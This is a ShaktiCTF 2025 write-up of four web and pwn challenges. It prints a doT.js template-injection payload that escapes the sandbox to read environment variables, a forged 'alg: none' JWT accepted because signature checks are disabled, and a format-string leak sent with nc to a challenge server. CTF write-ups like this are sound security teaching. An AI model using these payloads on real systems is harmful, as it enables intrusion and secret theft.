ShaktiCTF | 2025 | Writeups
===========================

**Templateception ‚Äî Web**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*jec9C57A3TBJI4YsjkGrkg.png)

Source Code Analysis
--------------------

We‚Äôre given the Node.js backend which does the following:

*   Accepts a filename, template (doT), and config via POST to `/upload`.
*   Saves the template, and renders it later at `/render/:file`.
*   Passes `{ name: "CTF Player" }` as the rendering context for templates.
*   Also renders the flag using EJS like this:
*   `res.render('rendered', { output, flag })`

The rendered HTML includes:

```
<pre><%= output %></pre>  
<script>  
  var FLAG = "<%= flag %>";  
</script>
```

So, the flag **isn‚Äôt rendered directly** ‚Äî it‚Äôs only accessible as a JavaScript variable called `FLAG`.

The templating engine used is `doT.js`, which supports JavaScript execution inside templates.  
We can inject arbitrary JavaScript by using this pattern:

```
{{=this.constructor.constructor("/* JS here */")()}}
```

This effectively breaks the sandbox and gives us access to Node internals, including environment variables!

To read the environment variable where the flag is stored, we submit the following as the template:

```
{{=this.constructor.constructor("return process.env")().FLAG}}
```

**Config:**

```
{}
```

**Filename:** `exploit.dot` (any name works)

Visiting `/render/exploit.dot` rendered:

```
shaktictf{***********}
```

The flag was successfully read from the server‚Äôs environment using template injection!

**Hooman ‚Äî Web**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ctafm64Hu8dfagcexTYo0Q.png)

We were asked to ‚Äúprove‚Äù we‚Äôre a hooman to access `/hooman`, which reveals the flag. The server gives us a JWT after login, but it always has:

```
{  
  "are_you_hooman": false  
}
```

And the `/hooman` route only lets us in if:

```
"are_you_hooman": true
```

In the backend, JWTs are decoded with **`verify_signature=False**`**:

```
jwt.decode(token, key=None, options={"verify_signature": False})
```

This means the server accepts **any token**, even unsigned ones.

We forged our own JWT:

```
Header:  {"alg": "none", "typ": "JWT"}  
Payload: {"username": "admin", "are_you_hooman": true}
```

Final token:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXJlX3lvdV9ob29tYW4iOnRydWV9.
```

‚û°Ô∏è Set it as a cookie named `token`.

Visiting `/hooman` with the forged token reveals:

> shaktictf{<real\_flag>}

**Secret Mission ‚Äî Pwn**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*yWlOGJN8lc13tyokjI3wUQ.png)

> _Welcome to the Armed Detective Agency ‚Äî the most famous detective agency in Yokohama!  
> A chest full of ability crystals has been lost somewhere in this binary.  
> Can you help us find it?_

We‚Äôre provided with an ELF binary: `mission`  
Running it connects us to a storyline, and prompts us with two questions:

*   Do you accept the mission? (Y/n)
*   What‚Äôs your name?

If we say ‚ÄúY‚Äù, and give any input as a name(eg: h4ch3r)‚Äîit displays: Looking forward to working with you h4ch3r

Initial Recon:
--------------

```
$ file mission  
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped  
  
$ checksec --file=mission  
RELRO           STACK CANARY      NX            PIE       
Full RELRO      Canary found      NX enabled    PIE enabled
```

The binary has all major protections:  
PIE: enabled  
NX: enabled  
Canary: found

This points toward a **stack-based buffer overflow** or similar.

Fuzzing input:
--------------

```
$ python3 -c "print('Y\n' + 'A'*200)" | ./mission
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

Classic stack overflow confirmed.  
But because there‚Äôs a **stack canary**, overflowing won‚Äôt be trivial.

Let‚Äôs try a format string vulnerability instead:

```
$ python3 -c "print('Y\n' + '%p.'*20)" | ./mission  
...  
Looking forward to working with you 0x7ffe19f4e620.(nil).(nil).0xa....
```

It **echoes back** our name using `printf(name)`, NOT `printf("%s", name)`, which makes it vulnerable!

**Try it on the actual server:**

```
$ python3 -c "print('Y\n' + '%p.'*30)" | nc 43.205.113.100 8576
```

Output (trimmed):

```
Looking forward to working with you ...  
0x746369746b616873.0x58655f3368747b66.0x5f64337463407274.0x656974696c696240....
```

Python script to decode the hex values:

```
leaked = [  
    0x746369746b616873,  
    0x58655f3368747b66,  
    0x5f64337463407274,  
    0x656974696c696240,  
    0x6873316e40765f35,  
    0x3368745f7475625f,  
    0x33725f67406c665f,  
    0x7d736e31406d  
]  
  
s = b''.join(p.to_bytes(8, 'little') for p in leaked)  
print(s.decode(errors="ignore"))
```

Running this python code renders the flag.

**Let the TV Buffer ‚Äî Pwn**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*pIh8nh1nL05WpZ2Kk0skow.png)

> _The TV usually keeps buffering. It isn‚Äôt doing that now for some reason. I dunno why.  
> I need to show my cool TV fixing skills for the upcoming science fair!  
> I wonder what I can do to put it back to how it originally was‚Ä¶_

Running the binary locally:

```
./let_the_tv_buffer
```

Gives us:

```
Reply >>
```

After entering a long input:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

The binary responded:

```
The TV is back to buffering! Thanks!  
...wait. It is showing some sorta secret code.  
shaktictf{REDACTED}
```
